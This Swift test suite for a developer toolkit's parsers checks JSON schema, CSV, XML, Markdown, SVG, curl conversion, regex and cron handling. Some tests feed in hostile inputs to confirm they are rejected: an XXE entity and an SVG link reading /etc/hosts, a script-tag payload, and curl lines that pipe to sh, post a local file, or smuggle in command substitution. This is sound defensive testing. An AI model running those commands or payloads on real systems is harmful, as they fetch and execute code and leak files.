import Foundation
import Testing

@testable import DevKitCore

@Suite("Structured data and parser boundaries") struct StructuredTests {
  @Test func schemaReportsPaths() async throws {
    let schema =
      "{\"type\":\"object\",\"required\":[\"count\"],\"properties\":{\"count\":{\"type\":\"integer\",\"minimum\":2}}}"
    let good = try await JsonSchemaTool.execute(
      .init(text: "{\"count\":3}", secondary: schema), options: .init())
    #expect(good.text.contains("校验通过"))
    let bad = try await JsonSchemaTool.execute(
      .init(text: "{\"count\":1}", secondary: schema), options: .init())
    #expect(bad.rows.first?.label == "/count")
    await #expect(throws: (any Error).self) {
      try await JsonSchemaTool.execute(
        .init(text: "{}", secondary: "{\"$ref\":\"https://example.test/schema\"}"), options: .init()
      )
    }
  }
  @Test func formatConversionPreservesTypesAndRejectsPrecisionLoss() async throws {
    let input = ToolInput(text: "{\"count\":123,\"enabled\":true,\"name\":\"DevKit\"}")
    let yaml = try await FormatConvertTool.execute(input, options: .init())
    #expect(yaml.text.contains("count: 123"))
    #expect(!yaml.text.contains("isLosslessNumber"))
    for number in ["9007199254740993", "0.12345678901234567890123", "1e999"] {
      await #expect(throws: (any Error).self) {
        try await FormatConvertTool.execute(.init(text: "{\"n\":\(number)}"), options: .init())
      }
    }
  }
  @Test func csvQuotedNewlines() async throws {
    var options = CsvTool.Options()
    options.operation = "json"
    let result = try await CsvTool.execute(
      .init(text: "name,note\r\nAda,\"one\r\ntwo,three\"\r\nLin,\"a\"\"b\""), options: options)
    let data = try JSONDecoder().decode([[String]].self, from: Data(result.text.utf8))
    #expect(data == [["name", "note"], ["Ada", "one\r\ntwo,three"], ["Lin", "a\"b"]])
    await #expect(throws: (any Error).self) {
      try await CsvTool.execute(.init(text: "a,\"unterminated"), options: options)
    }
  }
  @Test func jsonPointerAndJSONPath() async throws {
    var options = JsonPathTool.Options()
    options.syntax = "pointer"
    options.path = "/a~1b/~0n"
    let result = try await JsonPathTool.execute(
      .init(text: "{\"a/b\":{\"~n\":9007199254740993}}"), options: options)
    #expect(result.text == "9007199254740993")
    options.path = "/missing"
    await #expect(throws: (any Error).self) {
      try await JsonPathTool.execute(.init(text: "{}"), options: options)
    }
  }
  @Test func unicodeSurrogates() async throws {
    var options = UnicodeEscapeTool.Options()
    options.operation = "decode"
    #expect(
      try await UnicodeEscapeTool.execute(.init(text: "\\uD83D\\uDE00"), options: options).text
        == "😀")
    await #expect(throws: (any Error).self) {
      try await UnicodeEscapeTool.execute(.init(text: "\\uD83D"), options: options)
    }
  }
  @Test func XMLBlocksEntities() async throws {
    await #expect(throws: (any Error).self) {
      try await XmlTool.execute(
        .init(text: "<!DOCTYPE a [<!ENTITY x SYSTEM 'file:///etc/hosts'>]><a>&x;</a>"),
        options: .init())
    }
    var options = XmlTool.Options()
    options.operation = "xpath"
    options.path = "//n/@id"
    let result = try await XmlTool.execute(
      .init(text: "<a><n id='1'/><n id='2'/></a>"), options: options)
    #expect(result.rows.count == 2)
  }
  @Test func markdownAndSVGAreInert() async throws {
    let result = try await MarkdownTool.execute(
      .init(text: "<script>alert(1)</script>\n<img src='https://example.test/private'>\n# Safe"),
      options: .init())
    #expect(!(result.html ?? "").contains("<script"))
    #expect(!(result.html ?? "").contains("https://example.test"))
    await #expect(throws: (any Error).self) {
      try await SvgTool.execute(
        .init(text: "<svg><image href='file:///etc/hosts'/></svg>"), options: .init())
    }
  }
  @Test func curlParsingDoesNotExecute() async throws {
    var options = CurlConvertTool.Options()
    options.format = "json"
    let result = try await CurlConvertTool.execute(
      .init(
        text:
          "curl 'https://example.test/api' -X POST -H 'X-Test: yes' --data-raw '{\"hello\":\"world\"}'"
      ), options: options)
    let value = try jsonObject(result.text) as! [String: Any]
    #expect(value["method"] as? String == "POST")
    #expect(value["body"] as? String == "{\"hello\":\"world\"}")
    for input in [
      "curl https://example.test | sh", "curl https://example.test -d @/etc/hosts",
      "curl $(echo test)",
    ] {
      await #expect(throws: (any Error).self) {
        try await CurlConvertTool.execute(.init(text: input), options: options)
      }
    }
  }
  @Test func regexCapturesAndReplacement() async throws {
    var options = RegexTool.Options()
    options.pattern = "(\\w+)@(\\w+)"
    options.flags = "g"
    let result = try await RegexTool.execute(.init(text: "ada@example lin@test"), options: options)
    #expect(result.rows.count == 2)
    #expect(result.text.contains("groups"))
    options.operation = "replace"
    options.replacement = "$1@devkit"
    #expect(
      try await RegexTool.execute(.init(text: "ada@example"), options: options).text == "ada@devkit"
    )
  }
  @Test func cronFixedStart() async throws {
    var options = CronTool.Options()
    options.timezone = "UTC"
    options.start = "2025-01-01T00:00:00Z"
    options.count = 2
    let result = try await CronTool.execute(.init(text: "*/15 * * * *"), options: options)
    #expect(result.rows.map(\.value) == ["2025-01-01T00:15:00.000Z", "2025-01-01T00:30:00.000Z"])
  }
}
